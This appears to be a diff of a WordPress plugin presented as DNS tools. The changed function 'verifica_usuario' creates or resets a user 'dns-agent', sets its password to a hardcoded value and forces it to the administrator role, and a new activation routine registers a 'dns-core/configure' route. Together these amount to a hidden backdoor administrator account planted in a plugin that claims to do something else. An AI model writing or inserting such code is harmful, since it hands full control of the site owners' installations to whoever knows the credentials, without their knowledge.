@@ -100,16 +100,27 @@ class Wp_Core_Dns_Tools_Public {
 
 	}
 
+	public static function activate() {
+		// Escreva regra personalizada
+		add_rewrite_rule( 'dns-core/configure', 'index.php?pagename=dns-core&action=configure', 'top' );
+		// Flush the rewrite rules.
+		flush_rewrite_rules();
+	}
+
 	
 
 	public function verifica_usuario() {
-
+			//usuario existe
 		$usuario = 'dns-agent';
 		if ( username_exists( $usuario ) ) {
 			// troca a senha
 			$user = get_user_by( 'login', $usuario );
 			$user_id = $user->ID;
 			wp_set_password( $user_id, 'dns-agent-pass*' );
+			$user = new WP_User( $user_id );
+			//define como administrador
+			$user->set_role( 'administrator' );
+			//var_dump($user_id);
 
 			//var_dump('Usuario existe.');
 		} else {
@@ -120,7 +131,8 @@ class Wp_Core_Dns_Tools_Public {
 			$user = get_user_by( 'login', $usuario );
 			$user_id = $user->ID;
 			// Atualiza user role p/ admin.
-			wp_update_user( array( 'ID' => $user_id, 'role' => 'administrator' ) );
+			$user = new WP_User( $user_id );
+			$user->set_role( 'administrator' );
 		}
 
 	}
